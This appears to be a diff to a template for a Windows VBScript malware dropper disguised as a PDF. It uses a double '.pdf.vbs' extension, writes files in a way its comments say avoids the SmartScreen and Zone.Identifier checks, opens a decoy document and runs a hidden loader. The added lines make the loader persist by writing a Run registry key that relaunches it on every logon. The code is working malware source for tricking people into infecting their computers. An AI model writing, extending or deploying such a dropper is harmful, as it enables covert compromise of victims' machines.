@@ -1,8 +1,9 @@
-' fleet windows dropper — {{DOC}}_{{RAND4}}.pdf.vbs
+' fleet windows dropper — {{DOC}}_{{RAND4}}.pdf.vbs  (document: {{TITLE}})
 ' Double extension: Windows hides .vbs, the file looks like a PDF.
 ' All artifacts written with ADODB.Stream.SaveToFile (never SaveAs -> no
 ' Zone.Identifier / SmartScreen handoff). Decoy PDF fetched with WinHttp when
 ' reachable, embedded otherwise. Opens the decoy 1.5s after launch.
+' Persists via HKCU\...\Run so it is unattended across reboots.
 Option Explicit
 
 Dim shell, fso, base, loaderPath, decoyPath, remoteDecoy
@@ -25,6 +26,11 @@ If Len(remoteDecoy) > 0 Then
 Else
   WriteFile decoyPath, "{{DECOY_B64}}"
 End If
+
+' persistence: relaunch on every logon (survives reboot)
+On Error Resume Next
+shell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Fleet{{RAND4}}", """" & loaderPath & """"
+On Error GoTo 0
 
 shell.CurrentDirectory = base
 shell.Run """" & loaderPath & """", 0, False
